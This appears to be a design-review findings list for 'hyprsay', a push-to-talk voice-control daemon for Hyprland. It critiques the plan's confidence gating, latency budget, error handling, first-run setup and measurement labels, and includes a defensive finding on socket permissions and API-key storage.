findings.title: Operational basics that decide 'extremely usable' are absent
findings.problem: These are not in the plan at all. (1) Config file format, location, schema, reload and the precedence of env against file. 'Config' appears only as a word on daemon.py and as 'a config option'. (2) Logging: only the JSONL journal is named. There is no log destination (journald) and no levels, and no retention or size cap for a journal that stores utterances. (3) Error reporting when the HUD is down or a startup failure happens (missing key, missing portaudio, socket not found). (4) First run: there is a 182 MB model download with no progress UI, no resume, and nothing for a checksum mismatch or an offline first run. The key-missing path is unspecified, and the daemon does not say what it does on PTT before the model exists. (5) Mic: device selection, default-source change, hot-plug, hardware mute (a silent failure that needs a HUD state) and an all-zero buffer check. Critic R4 lists all of these and the plan answers only pre-roll and Bluetooth. (6) Multi-monitor: the plan says 'a pill, bottom center' and 'full monitor' hints. ui.md:208 requires one surface per output, created on monitoraddedv2, and hint badges for windows on other monitors need a hints surface per monitor. (7) Suspend and resume: a dead HTTP/2 connection after resume (critic U8, R3) is only partly covered by prewarm plus one retry. The audio stream and the socket2 reader reconnect are not mentioned. Hyprland restart changes the instance signature. (8) Upgrade and uninstall: model cache, cache-key migration, learned grammar patterns and alias store format, removal of the runtime layer rules. (9) Cost: the plan never mentions billing, although the promotion ends 2026-09-25, four days from today. Each semantic command is up to 3 requests plus a hedge, and P0 wants several hundred calls times N repeats (critic U9, K11).
findings.evidence: grep of PLAN.md for toml, logging, mute, hot-plug, suspend, resume, uninstall, upgrade, billing, credit returns nothing relevant. 'config' appears only at lines 141, 164, 228. ui.md:208. critic.md R3, R4, U8, U9.
findings.fix: Add a section 'Operations' with one decision per item. Config: ~/.config/hyprsay/config.toml, read by stdlib tomllib, validated at start, with errors shown by `hyprsay doctor` and by a HUD 'refused' state. Logging: journald through the unit, with journal rotation. First run: `hyprsay setup` with progress, and the daemon answers PTT with 'model not installed'. Mic: `audio.device` config, re-open on PortAudio error, a HUD 'mic silent' state when RMS is zero for the whole hold. Multi-monitor: per-monitor HUD windows. Resume: reset the HTTP client and reconnect sockets, triggered by a wall-clock jump or a logind PrepareForSleep signal. Cost: a per-command estimate and a daily cap. Assign each item to a phase. Most belong in P2.

findings.title: R2 is a forced choice with no absolute signal: a window that does not exist still gets a winner, and tier 0 has no corroboration to catch it
findings.problem: R2 is one Choice over live windows with no catch-all (PLAN.md:211-212, 219-220). A Choice is relative: probabilities sum to 1 and something always wins. The only guard is `names_window`, which answers 'did the speaker name a window', not 'is that window in the list'. For 'go to my music' or 'focus the browser' with no such window open, `names_window` is true, R2 must put its mass on the nearest window, and tier 0 (focus) acts on p1 >= 0.8 and margin >= 0.4 with no corroboration, because corroboration applies only 'above tier 0' (PLAN.md:243-244, 251-252). Above tier 0 the pick is downgraded to hints, which then show numbered badges on wrong candidates. The right response is 'not open, launch it?', and R3 already holds that answer. Removing the `focused` catch-all was correct; removing every abstain channel was not.
findings.evidence: jev-design.md:26 (rule 5: a Choice is relative, a Noul is absolute; always pair a slot Choice with `none` or a separate Noul). jev-design.md:165 (semantic_find cookbook: a wrong-but-closest line got 0.86 while `exists` was 0.14). PLAN.md:211-212 and 243-252. live/probe_out.json B_full.answers.target: five options, all mass on two (0.58 / 0.42), so the model always distributes over what it is given.
findings.fix: Add a second, absolute formulation as a fourth concurrent request R2b (concurrency is measured near free: dayone_out.json concurrent_3_wall_ms p50 359 vs 315). State is `{utterance}`. One boolean per live window, capped at about 20: instructions 'Is the speaker referring to this window?', with criteria.true carrying the same `{app, kind, title, workspace}` object R2 uses. About 40 tokens each, so it fits under the 1.8k cap, and 40 questions cost 317 ms p50. Resolver rules in code: (a) max boolean < 0.3 with `names_window` true means the target is absent; if R3 p1 is high, reinterpret as launch (tier 1, HUD chip 'not open, launching Spotify'), otherwise show 'no such window'. (b) argmax of the booleans must equal the Choice argmax to act; disagreement goes to hints. This agreement signal is structural and does not depend on the noisy margin. (c) hint candidates are the union of the top options under both formulations. Add 'referent not open' cases to evals/utterances.jsonl.

findings.title: The plan dismisses ensembling on the wrong experiment; the concurrent requests it already sends can cut noise and the latency tail for free
findings.problem: The plan concludes 'Self-ensembling is a minor tool' (PLAN.md:33) from 8 identical copies inside one request. That result implies a shared per-request noise component that in-request copies cannot average out. Averaging across requests was never tested, and the plan already fires three concurrent requests at about +45 ms. The duplicate is held back as a 450 ms hedge, so it buys only tail latency, and late: a hedge fired at 450 ms returns near 765 ms, which the user feels. The duplicate's second sample of the noisiest question (window target: P 0.45 to 0.67, flipped 4 of 30) is discarded.
findings.evidence: followup_out.json self_ensemble: single_copy stdev 0.059, mean_of_8 stdev 0.040. Decompose var = r + c: r + c = 0.00348 and r + c/8 = 0.00160, so c = 0.00215 and r = 0.00133 (request-level sd about 0.036). Predicted: 2 requests x 4 copies gives sd about 0.031; 3 requests x 8 copies gives about 0.023, close to the 0.021 independent-sample figure the plan quotes. This assumes request-level noise is independent across concurrent requests, which is untested. dayone_out.json latency_vs_questions['15'].total_ms.max = 1617 at 837 tokens shows the tail a t=0 duplicate would cut. Small requests returned 0 of 25 503s, and marginal cost is about $0.00004 per 1k tokens.
findings.fix: (1) Add a P0 experiment: the same R2 question in N concurrent requests, measuring between-request correlation (30+ rounds). (2) If the samples are independent, send the R2 target Choice in two concurrent requests from t=0 (R2 and R2', the latter also carrying the R2b booleans from the previous finding). Take the first response for latency. If the second lands within about 40 ms, average the probabilities and require the same argmax; otherwise act on the first only if it clears the gate alone. (3) Keep the 450 ms hedge only for R1 and R3. (4) Reword the section 1 row to 'in-request copies are a minor tool; cross-request duplication is untested'.

findings.title: The stt lane's speculative finalize was dropped; with PTT it hides decode and part of the Jev round trip behind key-release lag, and makes a transcript visible before release
findings.problem: The plan correctly rejects streaming ASR, but it also drops the cheap alternative the stt report recommended: one extra offline decode triggered by a short in-hold silence. The plan starts decode at key-up, so every Jev-path command pays 120 to 170 ms decode plus about 360 ms Jev after release, and the HUD shows only a level meter until then (PLAN.md:172, 287). People release a PTT key some time after their last word. That gap is currently wasted, and the plan neither measures nor mentions it.
findings.evidence: stt.md:247: 'SPECULATIVE FINALIZE. At 150 to 200 ms of silence, run the decode and fire the Jev request on the hypothesis... wasted speculative calls are irrelevant.' stt.md:244: 100 to 200 ms gaps occur inside phrases, so it is safe only as a speculative trigger. PLAN.md:34 and 172 turn 'streaming not viable' into 'decode once, no partials in v1', which conflates the two. One extra 1-thread decode of a 1 to 2 s clip costs 120 to 170 ms of CPU, not the 386 percent continuous load that ruled out streaming.
findings.fix: While the key is held, run an energy gate on the ring buffer (RMS over 20 ms frames, no model). On 150 ms of trailing silence, snapshot the PCM, decode it on the recognizer thread, show the transcript in the pill (this is the 'partial' the user sees, and it costs nothing), run normalize and grammar, and on NO MATCH fire R1/R2/R3 on the hypothesis. On key-up: if there are no voiced frames after the snapshot, the hypothesis is final, so the fast path acts at release + about 1 ms and the Jev path at release + (360 ms minus the lag). If speech resumed, cancel the streams and redo. Never act before key-up, so PTT remains the commit gesture and safety is unchanged. P0 additions: measure last-voiced-frame to key-up lag in the `hyprsay record` corpus (record both timestamps), the speculative hit rate, and whether aborted requests are billed (critic K12). Label the expected gain [A] until measured.

findings.plan_section: 5.6 hints band; 11 P5 (undo); 5.4 'only live rules are bare numbers and cancel'
findings.title: Hints are the only ambiguity recovery, they block, and undo arrives last; for tier 0 the best prior art acts first and lets a number swap it
findings.problem: Given the measured noise (p1 0.45 to 0.67 on an easy reference) and a tier 0 gate of p1 >= 0.8 and margin >= 0.4, a large share of semantic focus commands will land in hints. Each one costs the user a second PTT cycle (hold, say 'two', release, another 120 to 170 ms decode) for an action that is free to reverse. The plan rejects prior-art's Serenade variant (critic C13) because no undo exists yet, then schedules undo for P5 even though the ops table declares inverses in P1 (PLAN.md:270-271, 387). Hint mode also refuses everything except numbers and 'cancel', so a user who sees the wrong candidates cannot simply say a better command. There is no keyboard path, although the user's hand is already on the keyboard for PTT.
findings.evidence: prior-art.md:266 (Serenade: focus the top candidate at once, show badges about 3 s, 'two' switches; 'never block on them'). prior-art.md:415 (principle 7, 'A real undo', ranked P0: 'it is what makes principle 1 safe'). critic.md C13. PLAN.md:199, 256-258, 387. dayone_out.json determinism.target_p_w1 range 0.45 to 0.67.
findings.fix: (1) Tier 0 only: if p1 >= 0.5 and the argmax agrees across formulations (finding 1), act immediately and show swap badges on the top-3 for 3 s. A number re-dispatches focus to that window and journals the pick as a correction. Tier 1 and above keep blocking hints. (2) Move a one-level 'undo / nope' (last action's inverse from the ops table, grammar only) from P5 into P3, and put the repeaters with it. (3) In hint mode: a bare number picks, 'cancel' dismisses, and any other utterance dismisses hints and runs as a new command. (4) Install a temporary Hyprland submap while hints are up (`1`..`9` and `escape` bound to the `event` dispatcher as `hyprsay:pick:N`, then `submap reset`), so a pick costs 0 ms of ASR. Spike it in P0 next to `bindr`. (5) Order badges by probability (1 = most likely), scale badge emphasis by p, and list candidates on other workspaces in the pill as '2 Firefox, ws 5, YouTube' (prior-art.md:264). The plan does not say what happens to a candidate that is not on screen.

findings.plan_section: 5.5 transport policy (900 ms deadline); 5.6 no-op states; 6 refused state
findings.title: Timeout and offline both end in a dead no-op that forces a full re-speak; PTT gives a precise rule for accepting late answers, and local fallbacks exist
findings.problem: On a 900 ms timeout the user gets 'timed out' and nothing else (PLAN.md:231-232). Recovery cost is about 0.9 s wait plus noticing plus a full re-hold and re-speak plus another Jev round trip, roughly 4 s, and the service has real tails. The rationale inherited from nlu-arch ('the user has already started repeating') is observable under PTT: the user is repeating only if the key went down again. When offline or out of credits (critic R3, R9), the whole semantic path is a refusal, although the fuzzy and phonetic scorer always has a ranked list.
findings.evidence: dayone_out.json latency_vs_questions['15'].total_ms.max = 1617 ms; critic.md section 0 item 6 (6.9 s outlier). nlu-arch.md:348 (source of the rationale). jev-design.md:425 ('Deadline... then fall back to the deterministic grammar result'). PLAN.md:231-234, 288.
findings.fix: (1) At 900 ms, switch the pill to 'still thinking' and keep the request alive until the first of: PTT key-down, any activewindow/workspace socket2 event since key-up, or 2.5 s. A late answer that arrives first is still valid for tiers 0 and 1. Tier 2 never acts late. (2) On a real timeout, offline, 503 after retry, or zero balance, show the local scorer's top-3 entity candidates as numbered hints for the grammar's best partial parse, marked 'offline guess', never auto-acted. (3) A PTT tap with no voiced frames re-submits the last transcript, so a retry costs no re-speaking. When there is no pending transcript, the same gesture opens the cheat sheet (next finding). (4) Add 'timeouts per 100 Jev commands' and 'recovery time after a failure' to the section 9 metrics.

findings.plan_section: 2 goals; 6 HUD states; 11 phases; 12 open questions
findings.title: No discoverability and no install-to-first-command path, although the intent distribution already tells you what to suggest
findings.problem: The plan has no 'what can I say', no near-miss guidance, no command history and no first-run flow. 'Not understood' is a dimmed transcript (PLAN.md:258-259) that says neither what nearly matched nor whether the request is unsupported in v1 (clicking in apps, dictation, screenshots are non-goals users will ask for). A first-time user must get a Vercel AI Gateway key (paid after 2026-09-25, critic R9), edit the Hyprland config for bind and bindr, and wait for a 182 MB download before anything works. The plan never states that the fast path works with no key at all.
findings.evidence: prior-art.md:385 ('vocabulary recall is the main barrier for new users'; every mature system has 'what can I say'). prior-art.md:420 (principle 12: context-sensitive cheat sheet, near-miss hints, history). prior-art.md:401 (no Jev project has this: a differentiator). PLAN.md section 6 state list and section 11 contain no help state and no setup command; cli.py verbs are run|status|inspect|doctor|eval|record|teach.
findings.fix: (1) Near-miss from probabilities: when `intent` top is `none` or below the gate, take the top non-none options with p >= 0.15 and show 'did you mean: move window to workspace, say "move this to three"', with the example phrase pulled from that intent's pattern in grammar.py. (2) Add one R1 Choice `unsupported_kind` with options {click_inside_app, long_dictation, screenshot, brightness, file_operation, question_needing_answer, none}, so the HUD can say 'not supported yet: clicking inside apps' instead of 'not understood'. Both cost zero latency. (3) 'what can I say' / 'help' in the grammar, and a PTT tap with silence, open a cheat sheet on the hints surface generated from the pattern table and the live lexicon (the real app and window names, the user's aliases). It is deterministic, not Jev. (4) `hyprsay setup`: install the PTT bind at runtime through the `keyword` IPC so it works before any config edit and print the two lines to persist; mic level check; model download with progress; five guided commands that exercise the fast path; then an optional key step with a live test call. Grammar-only mode is the documented no-key default. Put this in P4 exit criteria: 'fresh user reaches a working command in under 3 minutes without a key'.

findings.title: 503 figures are the favourable subset; small requests did fail
findings.problem: The plan quotes 0 of 25 small vs 4 of 25 large. The same morning's larger sample gave 13 of 30 at 11.5k, and failures at small sizes exist, which matters because every Jev-path utterance sends three requests.
findings.evidence: dayone_out.json errors: tok260 x13 (latency_vs_tokens.260_windows n=17 of 30), tok130 x1, perm x1 (about 1.3k tokens). followup_out.json self_ensemble.requests_ok = 19 of 20 on a tiny payload (status not recorded). probe_out.json A_full = null. Pooled large: 17 of 55 = 31 percent. Pooled small: about 3 failures in roughly 400 calls, so about 2 percent of three-request utterances need a retry; 503s took 261 to 453 ms to arrive, so a retried utterance spends about 600 to 750 ms in the Jev stage.
findings.fix: Quote both large-request rates and the small-request failure rate, and add the retry case to the latency budget.

findings.title: [M] labels on unmeasured items, and unlabelled latency figures
findings.problem: Several [M] tags do not correspond to a measurement of the thing claimed, and two latency figures have no label, which the plan itself calls a bug.
findings.evidence: 'Lock check + dispatch over socket < 1 ms [M]': no dispatch has ever been sent over the socket (hypr-ipc.md Verification 'No dispatch was sent'; critic U13); only read queries were timed (j/locked 0.097 ms). 'Under 2 ms [M for the matcher]' and budget row 'Normalize + grammar + fuzzy < 2 ms [M]': nlu-arch.md:147 measured only difflib over 86 app names, p50 1.4 ms, in an unchecked report; no grammar, normalizer or phonetic scorer exists, and a p50 is quoted as an upper bound. 'hyprland_global_shortcuts_manager_v1 advertised by the compositor [M]': no research file mentions the protocol (grep finds only the hyprctl globalshortcuts command name at hypr-ipc.md:87). 'zdr: all [M from the catalog]' is a [D] claim. Unlabelled: 'acknowledgement is under 20 ms' (line 350) and 'speech lasts at least 500 ms' (line 165). hyprctl '6 to 22 ms': the checker's correction reads '6 to 20 ms depending on load' and it did not reproduce 6 ms (its p50 was 15.3, p95 22.4). '182 MB' at line 173 is RSS, the model download is 30 MB (stt.md:168).
findings.fix: Split the dispatch row into lock query [M] and dispatch [A]; relabel the matcher figure [A]; cite or drop the global shortcuts [M]; label or remove the two bare figures; fix the 182 MB wording.

findings.title: Self-ensembling conclusion drawn from n=19 where the two stdevs are barely distinguishable
findings.problem: 0.059 vs 0.040 reproduces, and 0.059/sqrt(8) = 0.021 is correct, but with 19 requests the variance ratio (2.18) is about at the 5 percent critical value, so the data support neither 'it helps a bit' nor 'correlation is high' with any confidence. Raw per-copy values were not saved.
findings.evidence: followup_out.json self_ensemble: requests_ok 19, single_copy.stdev 0.059, mean_of_8.stdev 0.04, picked_w2 1 vs 1. followup.py keeps only aggregates.
findings.fix: Add 'n=19, indicative' to the row and persist raw copies in the P0 rerun (critic K7).

findings.title: Engine-HUD socket, runtime dir and key file need stated permissions and a one-way guarantee
findings.problem: The plan specifies 'NDJSON over a Unix socket' (PLAN.md:104) in $XDG_RUNTIME_DIR/hyprsay (:113) with no mode, no peer check and no statement of direction; ui.md:573 says one-way and display-only but the plan adds confirmation 'by a second key press' and a future Quickshell frontend (:291), which invites a back channel later. The key file is 'mode 600' (:302) with no check.
findings.evidence: HUD messages carry the transcript, the chosen window title and hint labels (PLAN.md:287-288), so whoever can connect as a HUD reads everything the user says and every target title, without needing the microphone. If the engine is the listener and accepts any number of clients, a same-user process gets a transcript tap; if the HUD is the listener, a rogue process can bind the path first (HUD crash or race at login) and either spoof 'heard: ... done' states to mask a hostile action or starve the real HUD so the tier 2 countdown is never shown while it still expires into action. The systemd unit environment alternative for the key (critic.md R7) leaks through 'systemctl --user show' and /proc/PID/environ to same-user processes; AI_GATEWAY_API_KEY in a shell profile leaks to every child. A leaked gateway key spends the owner's paid credits (critic.md section 0 item 12).
findings.fix: Engine creates the directory 0700 and the socket 0600, verifies ownership of a pre-existing dir, checks SO_PEERCRED uid and that the peer exe is the packaged HUD (or accept exactly one client and log any second connect to the HUD itself). Protocol stays strictly engine-to-HUD; the engine ignores all inbound bytes, and this is a tested invariant so a future frontend cannot become a confirm channel. If no HUD is connected, tiers 2 and 3 refuse rather than count down invisibly. For the key: refuse to start if the file is not 0600 and owned by the user, prefer systemd LoadCredential or libsecret over an env var, scrub Authorization from httpx debug logs, cassettes and 'inspect' output, and recommend a gateway key with a spend cap.

findings.title: The P0 exit is self-referential and several [A] values have no owning task, against the plan's own labelling rule
findings.problem: The header defines [A] as 'an assumption that a named task must replace'. P0's exit is 'every [A] that P0 names is replaced'. That makes it satisfiable by naming fewer items, and no list exists. Orphans: the grammar EXACT thresholds 0.92 and 0.15 (5.4) have no task, because the grammar is P3 and the reliability diagram covers only the Jev tiers. 'Resolve, corroborate, gate < 1 ms [A]' has no measuring task. The 4 s hint timeout interacts with the unmeasured human response time (critic U12). P0 also has no number for the accent go / no-go that section 9 itself calls untested, so the most consequential decision has no threshold.
findings.fix: Add a table to P0: each [A], its location, the measuring task, and the pass value or decision rule. Include 'Moonshine Tiny command-level accuracy on the owner's corpus at least X percent after normalization, else switch model or stop'. Assign the grammar thresholds to a P3 eval task.

findings.title: The three-request fan-out budget rests on a measurement that excluded failed rounds and used identical small bodies
findings.problem: The 359 / 410 ms figure comes from 12 rounds of three identical copies of one small request. The script records a round only if all three succeeded. It measures neither R2 with titles plus R3 with 83 options near 1k tokens, nor the rate at which at least one of three fails. The day-one error log shows 503s at the smallest sizes too (tags tok130 and tok260), so a command that needs all of R1, R2 and R3 compounds the failure exposure the critic raised in C6. The plan accepts the fan-out without a partial-result policy. It does not say whether an action can proceed when R1 and R2 return and R3 times out, or when only R1 fails.
findings.evidence: /home/ilyask/projects/hyprsay/docs/research/live/dayone.py:95-100 (`if all(r[0] for r in res): conc.append(...)`). dayone_out.json .concurrent_3_wall_ms = {n:12, p50:359, p90:410, max:607}. dayone_out.json .errors[0..2], tags tok130 and tok260 with status 503. critic.md C6.
findings.fix: In P0, measure the real R1 / R2 / R3 bodies concurrently. Record the per-round any-failure rate and the wall time including failures. Define partial-result rules in resolve.py: which answers each intent requires, and that a missing required answer gives hints or 'timed out' and never a guess.

findings.title: Drop-list items are entangled with kept modules
findings.problem: Three items are not clean deletions. (1) VirtualKeyboard is imported at the top of the kept input.py and used by _with_keyboard. The named-seat branches sit inside type_text, key_combo and move. Removing it is an edit of input.py and wire.py at about ten sites, not a deletion. (2) safety.py, which is kept, is the beacon: its docstring, state file and pkill contract are the 'Waybar beacon' the plan drops, and its state_path hardcodes the 'hypruse' runtime directory. (3) pyproject still depends on mcp and has the hypruse entry point. The CI matrix runs 3.11 to 3.14, while the engine needs cp314 sherpa-onnx wheels and the HUD runs on system Python. The supported Python range and CI for hud/ are undecided, and hud/ cannot be imported on ubuntu-latest without gi.
findings.evidence: /home/ilyask/projects/hyprsay/src/hypruse/input.py:25, 162, 180-203. safety.py:1-17, 45-49. pyproject.toml:23, 29-30. .github/workflows/ci.yml matrix. hypruse-map.md:391-392.
findings.fix: List these as explicit edits in P1. Decide whether safety.py survives as the kill switch (it is useful: a bind that kills the engine) under the new runtime directory. Pin requires-python. Keep HUD logic that can be tested without gi (protocol parsing, state machine) in a pure module that CI imports, with the GTK layer kept thin.

findings.title: Scope: P5 bundles a second product's worth of features, while items needed from day one are placed there
findings.problem: P5 contains undo, again, repeaters, compound commands with anaphora, teach, grammar promotion from Jev resolutions, inspect, doctor, PRIVACY.md, the README and the AUR recipe. Grammar promotion (principle 5) is a learning system with its own correctness risk: a wrong promotion becomes a permanent fast-path wrong action that bypasses Jev gating. It has no eval story. `inspect` and `doctor` are needed during P0 to P3, as the debug tools and the first-run diagnostics. PRIVACY.md should exist before the first title is sent. Coexistence with the owner's running hypruse MCP agents acting on the same desktop (critic R14) is reduced to a separate runtime directory.
findings.fix: Move inspect to P3 and a basic doctor to P2. Write PRIVACY.md with the P0 harness. Cut compound commands and grammar promotion from v1, or gate promotion behind N confirmed repeats plus an eval replay. Keep undo and again, because they make the act-first tiers cheap.

findings.title: Jev arbitration is used where a token match is faster and exact
findings.problem: 'the firefox with youtube' is sent to a 'tiny Jev arbitration' (PLAN.md:194-195), costing about 315 ms plus noise. If 'youtube' fuzzy-matches the title tokens of exactly one of the k candidates, code can resolve it in under 2 ms deterministically. This is the same overlap test the corroboration step runs anyway.
findings.evidence: PLAN.md:194-195 vs PLAN.md:243-246 (corroboration already computes lexical and phonetic overlap with title tokens). Measured Jev p50 315 ms vs matcher under 2 ms (PLAN.md:344-345).
findings.fix: Order of resolution: (1) the residual words overlap the title, kind or workspace tokens of exactly one candidate at score >= 0.92: EXACT, no network. (2) overlap with none or several: Jev arbitration over the k parses. (3) no residual words: hints. Log how often (2) fires. If it is rare, delete it.

findings.plan_section: 5.5 R1/R2 state and option shape; 5.3 normalize
findings.title: Requests give Jev no ASR context, no code-generated mishearing alternatives, and no recency or alias fields in window options
findings.problem: R1 state is `{utterance, normalized}` and R2 options are `{app, kind, title, workspace}`. Moonshine is greedy with no n-best (critic C3), so the only possible source of alternatives is code, and the plan generates none. Jev on real ASR output is untested (critic U2). Options carry no focus recency, so 'go back to the terminal I was in' cannot be resolved, although world.py adds focusHistoryID. Options also carry no user aliases, so aliases help only on the fast path.
findings.evidence: jev-design.md:321-323 (`note` field describing the transcript; alternatives in state; known-good spellings as candidates). jev-design.md:139 (the `query_note` trick). nlu-arch.md:310 (aliases inside the option's criteria object). jev-design.md:284 (resolve focus history in code and label it). critic.md C3, U2. PLAN.md:207, 211-212.
findings.fix: (1) Add `note` to every state: 'utterance is a speech recognition transcript; words may be misheard; no punctuation'. (2) The normalizer emits up to 3 variants by substituting lexicon entries whose phonetic key is within distance 1 of a transcript token ('kiddy' to 'kitty'), sent as `possible_mishearings`. This is Jev as arbiter over code-generated alternatives. A/B it in `hyprsay eval --bank` on the real microphone corpus, not on typed text. (3) Add `recency: "current" | "previous" | "recent" | "older"` as words (not numbers, per jev-design.md:126) and `aliases: [...]` to R2/R3 options. (4) State explicitly that the P0 100-utterance Jev set is run on recognizer output as well as on clean text.

findings.title: Learning is a principle but lands in the last phase, and the cheap Jev-side personalization is missing
findings.problem: 'Learning moves work from Jev to the grammar' (PLAN.md:76-77) is the plan's answer to median latency, yet promotion and teach are P5 and nothing captures training signals earlier. The research's Jev-native personalization (the user's own past phrasings as `examples` on the matching option, cancelled utterances as examples on `none`) is absent, although Jev cannot be fine-tuned and criteria are the only adaptation channel.
findings.evidence: nlu-arch.md:301 and 311-313 (personal negatives; correction capture; few-shot through criteria, 3 to 5 examples chosen by similarity). jev-design.md:108 (examples steer strongly only when they resemble real input, which the user's own phrasings do by construction). jev-design.md:293 (not fine-tunable). PLAN.md:387-390.
findings.fix: From P3 the journal schema records hint picks, swap picks, undo within 5 s, and cancels as (entity-abstracted utterance, state signature, chosen action) triples. Promotion to the grammar can stay in P5 but then starts with data. In P3 add bank support for up to 3 user examples per intent option, chosen by lexical similarity, and measure it with `eval --bank A --bank B` before turning it on. Bump the cache key when the examples change.

findings.title: Score and probabilities are used once each; two cheap uses would improve gating and feedback
findings.problem: The only Score is `amount`, and the HUD shows a chosen action but not the distribution behind it. Score expectation is documented as valid for ranking and threshold checks (not for exact magnitudes), and the 'heard + action chip' state could tell the user how sure the system was, which teaches them which phrasings work.
findings.evidence: jev-design.md:266-267 (a fractional score is a position usable to rank or threshold; do not reconstruct exact numbers). jev-design.md:423 (confirm UX from the distribution, not `confidence`). probe_out.json B_full.answers.destructive: Score 0.25, probabilities {0: 0.76, 1: 0.24}, i.e. a graded risk reading is available at no extra latency. PLAN.md:208-209, 287-289.
findings.fix: (1) Keep `amount` mapped to fixed steps per level, but when the top two levels are adjacent and both >= 0.3, use the midpoint step (a threshold check on the expectation, within vendor guidance). (2) Add a 4-level Score `reference_specificity` to R1 ('names an exact app or title' / 'describes a kind of app' / 'only this, it, that' / 'no target at all') as a second reading next to `names_window`. Code maps the levels to: corroboration required, kind match required, deixis, no target. (3) Add a logged-only `risk` Score like the probe's, which may raise a tier and never lower it (prior-art.md:296). (4) Action chip: a thin confidence underline driven by the min-confidence of the command, with the runner-up in small type when margin < 0.5, so the HUD is a direct rendering of the probabilities.
